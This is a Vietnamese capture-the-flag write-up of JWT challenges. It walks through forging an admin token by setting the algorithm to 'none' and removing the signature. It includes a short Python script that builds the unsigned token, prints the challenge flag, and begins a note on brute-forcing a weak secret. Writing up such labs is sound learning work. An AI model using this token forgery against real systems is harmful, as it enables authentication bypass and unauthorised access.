# Trần Mạnh Huy - JWT - json web token
<hr>
# Table of content 
<hr>

* [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
* [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
* [Chall 3: JWT - Revoked token](#chall-3-jwt---revoked-token)
* [Chall 4: JSON Web Token (JWT) - Public key](#chall-4-json-web-token-jwt---public-key) 

<hr>

## Chall 1: JSON Web Token (JWT) - Introduction
```
To validate the challenge, connect as admin.
```
Ta có login form như sau 

![image](https://user-images.githubusercontent.com/104350480/219703907-2e0197cf-93da-4230-a230-164f0473c52c.png)

Để ý có nhấn vào guest thử rồi check burp:

![image](https://user-images.githubusercontent.com/104350480/219705924-bb74b020-b6d7-48b5-a735-c662ef36634e.png)

Sửa thử username = admin thì server trả về lỗi: 

![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)



Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.

![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)

> flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

```
import base64
import json

header = {'typ':'JWT', 'alg':'none'}
payload = {'username':'admin'}
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
data = header_encoded +'.'+payload_encoded+'.'
print(data)
```

## Chall 2: JSON Web Token (JWT) - Weak secret

Dạng này thì là weak secret key, nghe đã biết phải brute force để tìm kiếm được secret key rồi.

